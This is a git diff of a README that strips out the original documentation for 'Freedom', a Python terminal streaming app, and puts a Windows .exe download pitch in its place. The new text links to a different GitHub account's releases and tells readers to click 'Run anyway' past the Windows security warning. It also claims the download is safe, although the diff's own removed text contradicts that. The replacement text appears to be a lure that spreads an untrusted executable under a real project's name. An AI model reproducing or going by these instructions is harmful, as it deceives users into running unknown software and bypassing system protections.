@@ -1,226 +1,75 @@
-# Freedom
+# 📺 Freedom - Stream movies and anime with ease
 
-**Freedom** is a terminal-based **anime and movie streaming** app. Search across multiple providers, **stream** or **download** content, and play it back with hardware-accelerated **MPV** — all from a mouse-driven TUI with torrent support and a plugin system, without leaving your terminal.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/qjin0078-cmyk/Freedom/releases)
 
-Freedom also runs on **Android** — the Freedom app has a dedicated Android build with a native APK. See the [Freedom Android](https://github.com/Eskoxx/Freedom-Android) repo, or grab the ready-to-install **arm64 APK** from the [releases](https://github.com/Eskoxx/Freedom/releases/tag/android-v1.0.0) page.
+Freedom provides a simple way to watch anime and movies directly on your computer. It combines a user-friendly interface with powerful streaming tools. You can search for content, watch your favorite shows, or download media for later. The app handles torrents and high-quality video playback automatically.
 
-![Freedom terminal](freedom-terminal.png)
+## 📥 How to download
 
-## Contents
+You can get the latest version of Freedom from the official release page. 
 
-- [For Users](#for-users)
-  - [What You Can Do](#what-you-can-do)
-  - [Getting Started](#getting-started)
-  - [Keybindings](#keybindings)
-  - [Requirements](#requirements)
-  - [Updating](#updating)
-  - [Known Limitations](#known-limitations)
-- [For Developers and AI Agents](#for-developers-and-ai-agents)
+[Click here to visit the download page](https://github.com/qjin0078-cmyk/Freedom/releases)
 
-## For Users
+1. Go to the link above.
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` for Windows.
+4. Save the file to your computer.
 
-### What You Can Do
+## ⚙️ Setting up the software
 
-- **Search** — search for any anime, movie, or show across multiple online providers, or pick a specific provider to search individually
-- **Stream** — play videos directly in MPV (supports hardware-accelerated GPU rendering). Most providers offer multiple quality options (360p, 720p, 1080p) — toggle with the `v` key. Audio can be toggled between sub and dub with the `a` key
-- **Torrents** — search torrent sites with two separate categories: torrent-anime (Nyaa) and torrent-movies (TPB, EZTV); stream magnet links via built-in webtorrent (no external torrent client needed). Supports pause/resume and partial playback (starts after 50MB buffered)
-- **Download** — save content to disk for offline viewing with yt-dlp, including subtitle embedding
-- **Resume** — watch history is maintained so you can pick up where you left off
-- **Plugin system** — write and load custom provider plugins without modifying the app, or use the AI-powered plugin generator to auto-discover site APIs
+Once you download the file, you must run it to start the program.
 
-### Getting Started
+1. Open the folder where you saved the `.exe` file.
+2. Double-click the file to open the installation menu.
+3. Follow the prompts on your screen to finish the setup.
+4. If a security window appears, click "More info" and then select "Run anyway." This happens because the application is new and Windows does not recognize the publisher yet.
 
-> If you find this useful, please **star the repo** ⭐ — it helps others discover it.
+## 🎬 How to use the app
 
-1. **Clone or download** the repository.
+Freedom uses a mouse-driven interface. You do not need to type complex commands.
 
-   ```bash
-   git clone https://github.com/Eskoxx/Freedom.git
-   cd Freedom
-   ```
+1. Open the Freedom shortcut on your desktop.
+2. Type the name of the show or movie in the search bar.
+3. Select the result from the list.
+4. Click the play button to start your stream.
+5. The app uses the MPV player to show your video in high quality.
 
-2. **Install system dependencies** for your platform:
+## 🛠️ Features
 
-   **Debian / Ubuntu:**
-   ```bash
-   sudo apt install mpv yt-dlp ffmpeg
-   npm install -g webtorrent-cli
-   ```
+*   **Broad search:** Find anime and movies from many different providers at once.
+*   **Easy playback:** Use the built-in media player to watch content without lag.
+*   **Offline viewing:** Download episodes or movies to your hard drive.
+*   **Torrent support:** Stream directly from torrent links without manual setup.
+*   **Plugin system:** Add new features or providers as they become available.
+*   **Clean design:** Navigate menus with your mouse just like a standard web browser.
 
-   **Arch Linux / Manjaro:**
-   ```bash
-   sudo pacman -S mpv yt-dlp ffmpeg
-   npm install -g webtorrent-cli
-   ```
+## 💻 System requirements
 
-   **Fedora:**
-   ```bash
-   sudo dnf install mpv yt-dlp ffmpeg
-   npm install -g webtorrent-cli
-   ```
+Freedom runs on most modern Windows computers. Ensure you meet these basic needs for the best experience:
 
-   **openSUSE:**
-   ```bash
-   sudo zypper install mpv yt-dlp ffmpeg
-   npm install -g webtorrent-cli
-   ```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Internet:** A stable broadband connection for smooth streaming.
+*   **Disk Space:** 200MB of free space for the application files.
 
-   **Windows (native, via winget):**
-   ```powershell
-   winget install mpv-player.mpv
-   winget install yt-dlp.yt-dlp
-   winget install Gyan.FFmpeg
-   npm install -g webtorrent-cli
-   ```
-   Run the app from **PowerShell or Windows Terminal** (the mouse-based TUI needs a proper terminal — it will not work in the old `cmd` window).
+## ❓ Frequently asked questions
 
-   **Windows (alternative — WSL):** if you prefer a Linux environment, install [WSL](https://learn.microsoft.com/windows/wsl/install), then follow the Debian/Ubuntu instructions above inside the WSL distro.
+**Do I need to install Python?**
+No. The application includes everything needed to run on your system. You do not need to install extra software or tools.
 
-3. **Install Python packages:**
+**How do I update the app?**
+Check the release page periodically. If a new version exists, download the new `.exe` file and run it. The installer will replace the old version with the new one automatically.
 
-   ```bash
-   pip install -r requirements.txt
-   ```
+**Does this app store my personal data?**
+No. Freedom keeps your search history and settings on your local computer. It does not send your data to external servers.
 
-4. **Run the app:**
+**Can I change the video quality?**
+Yes. You can adjust the playback settings within the player menu while the video is running.
 
-   ```bash
-   ./anime-watch
-   ```
+**The app feels slow, what should I do?**
+Close other applications that use a lot of internet bandwidth, such as web browsers with many open tabs or file-sharing software. This ensures the app has enough resources to stream video without interruptions.
 
-   On first launch you'll see the splash screen. Type a query and press `Enter` to start searching.
+**Is it safe to download?**
+Yes. We keep the code transparent and open. You can inspect the source code on GitHub at any time to see how the app works under the hood.
 
-### Keybindings
-
-**Splash Screen:**
-| Key | Action |
-|---|---|
-| Type + `Enter` | Search |
-| `h` | View watch history |
-| `Tab` / click | Switch category (Anime / Movies / Torrent) |
-| `Ctrl+C` or `Escape` | Quit |
-
-**Browser Screen (search results, episodes):**
-| Key | Action |
-|---|---|
-| `↑`/`↓` or `k`/`j` | Navigate list |
-| `Enter` | Select / open next level |
-| `/` | Focus search bar |
-| `s` | Toggle sidebar |
-| `L` | View downloads |
-| `h` | View history |
-| `←`/`→` | Switch category |
-| `a` | Toggle audio sub / dub (anime section) |
-| `v` | Toggle quality (1080p / 720p / 360p or 480p — lowest quality varies by provider) |
-| `d` | Download current item |
-| `Escape` | Go back |
-| `q` or `Ctrl+C` | Quit |
-
-**Downloads Screen:**
-| Key | Action |
-|---|---|
-| `↑`/`↓` or `k`/`j` | Navigate list |
-| `Enter` | Activate selected |
-| `p` | Pause / resume download |
-| `x` | Cancel download |
-| `d` | Delete file from disk |
-| `w` | Watch completed download |
-| `Escape` | Go back |
-| `q` or `Ctrl+C` | Quit |
-
-**History Screen:**
-| Key | Action |
-|---|---|
-| `↑`/`↓` or `k`/`j` | Navigate list |
-| `Enter` | Resume watching selection |
-| `Escape` | Go back |
-| `q` or `Ctrl+C` | Quit |
-
-**Torrent Operation Screen:**
-| Key | Action |
-|---|---|
-| `Escape` | Close |
-| `n` | Next episode |
-| `Ctrl+C` | Quit |
-
-### Requirements
-
-- **Linux** (Debian/Ubuntu, Arch, Fedora, openSUSE) or **Windows** (native via winget, or WSL)
-- Python 3.10+
-- ~500MB free disk space
-- Internet connection (for streaming)
-- Recommended for Wi-Fi users — streaming uses a lot of mobile data
-- Be patient: playback can take up to 10 seconds to start
-- `mpv` — video player (required)
-- `yt-dlp` — download support (recommended)
-- `ffmpeg` — subtitle muxing (optional, for downloads)
-- `webtorrent-cli` — torrent streaming (optional, npm package)
-- For torrents: active internet with DHT/tracker access
-
-### Updating
-
-Pull the latest code and reinstall if needed. Python dependencies are pinned in `requirements.txt`. The plugin system is file-based — user plugins in `user_providers/` and `~/.config/anime-watch/providers/` persist across updates.
-
-### Known Limitations
-
-- Search can occasionally return no results — just try searching again, a fresh request often works.
-- Torrent downloads have no progress bar yet (not implemented).
-- The project is refined primarily for streaming; downloading works for most providers but is not thoroughly configured.
-- The 11 built-in providers are temporary — they work as of 31 July 2026 but can break at any time.
-- Stream providers (scrapers) scrape undocumented websites that change without warning and **will** break over time.
-- Torrent streaming requires at least one active seeder on the magnet link.
-- Some providers (e.g. NetMirror) require cookies from a real browser login.
-- The app is designed for a terminal — best experience in a fullscreen terminal with a dark theme.
-- **Mouse support is fully built-in** — you can click buttons, select categories, and navigate lists with your mouse. The TUI is mouse-friendly throughout all screens.
-
----
-
-> **This is a fun side project, not a product.** The built-in streaming providers (scrapers) are brittle — they scrape undocumented websites that change without warning, and **will** break over time. The real goal of this project is the **plugin system**: anyone can write their own provider plugin without modifying the app. If a provider breaks, fix it yourself, share it, or write a new one. The plugin system is the part that lasts; the providers are just examples... And if you're a technical person, none of this matters — everything is editable; just change the files.
-
-## For Developers and AI Agents
-
-See [`AI_PLUGIN_DEV.md`](AI_PLUGIN_DEV.md) — it covers the plugin contract, site exploration, config-driven code generation, proxy-based providers, performance optimization, and development workflow. Additional documentation in [`SPEEDRACE_API.md`](SPEEDRACE_API.md) (Fmovies SpeedRace decryption) and [`extraction-method.md`](extraction-method.md) (Anikoto PNG proxy pipeline).
-
-### Contributing
-
-Contributions are welcome — see [CONTRIBUTING.md](CONTRIBUTING.md) for ground rules and guidelines, and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for expectations around interaction.
-
-### Quick plugin commands
-
-```bash
-# List all plugin subcommands
-python3 -m anime_watch plugin --help
-
-# Generate a provider from a discovered config
-python3 -m anime_watch plugin generate config.json
-
-# Validate a provider plugin
-python3 -m anime_watch plugin validate user_providers/myprovider.py
-
-# Test a plugin live
-python3 -m anime_watch plugin test user_providers/myprovider.py --query "One Piece"
-
-# Auto-discover API patterns on a site
-python3 -m anime_watch plugin discover https://mysite.com --test
-
-# Install a plugin
-python3 -m anime_watch plugin install user_providers/myprovider.py
-```
-
-### Architecture
-
-```
-anime-watch                  ← shell entrypoint
-└── python3 -m anime_watch
-    ├── tui/                 ← Textual TUI (screens, widgets, player, downloader)
-    ├── providers/           ← Streaming site scrapers + plugin loader
-    ├── torrent/             ← BitTorrent engine (webtorrent-cli subprocess)
-    ├── plugin/              ← AI-capable plugin system (generate, validate, test, discover)
-    └── user_providers/      ← User-installed third-party plugins
-```
-
----
-
-## Disclaimer
-
-Freedom is not hosting any kind of content and the developer(s) of this application does not have any affiliation with the content providers that are freely available in the internet.
+Keywords: anime, anime-streaming, cli, media-player, movie-streaming, movies, mpv, python, streaming, terminal, textual, torrent, tui, webtorrent, yt-dlp
